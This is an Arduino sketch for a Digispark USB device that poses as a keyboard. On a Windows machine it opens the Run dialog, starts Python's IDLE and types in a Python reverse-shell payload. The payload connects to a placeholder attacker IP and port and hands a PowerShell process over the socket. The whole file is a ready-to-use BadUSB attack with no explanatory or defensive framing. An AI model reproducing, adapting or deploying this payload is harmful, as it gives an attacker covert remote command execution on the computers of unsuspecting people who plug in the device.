#include "DigiKeyboard.h"
#define KEY_UP_ARROW     0x52
#define KEY_DOWN_ARROW   0x51
#define KEY_LEFT_ARROW   0x50
#define KEY_RIGHT_ARROW  0x4F
#define KEY_LEFT_GUI     0xE3
#define KEY_ESC          0x29
#define KEY_HOME         0x4A
#define KEY_INSERT       0x49
#define KEY_NUM_LOCK     0x53
#define KEY_SCROLL_LOCK  0x47
#define KEY_CAPS_LOCK    0x39
#define KEY_TAB          0x2B

void digiBegin() {
  DigiKeyboard.sendKeyStroke(0,0);
  DigiKeyboard.delay(50);
}

void digiEnd() {
  const int led=1;
  pinMode(led, OUTPUT);
  while (1) {
    digitalWrite(led, !digitalRead(led));
    DigiKeyboard.delay(1000);
  }
}

void printText(fstr_t *txt) {
  DigiKeyboard.print(txt);
  DigiKeyboard.update();
}

void setup() {
  digiBegin();
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  printText(F("idle"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  printText(F("exec(\"\"\"import os, socket, subprocess, threading, sys\\ndef s2p(s, p):\\n    while True:p.stdin.write(s.recv(1024).decode()); p.stdin.flush()\\ndef p2s(s, p):\\n    while True: s.send(p.stdout.read(1).encode())\\ns=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\\nwhile True:\\n    try: s.connect((\"<IP>\", <PORT>)); break\\n    except: pass\\np=subprocess.Popen([\"powershell.exe\"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, text=True)\\nthreading.Thread(target=s2p, args=[s,p], daemon=True).start()\\nthreading.Thread(target=p2s, args=[s,p], daemon=True).start()\\ntry: p.wait()\\nexcept: s.close(); sys.exit(0)\"\"\")"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  digiEnd();
}

/* Unused endless loop */
void loop() {}
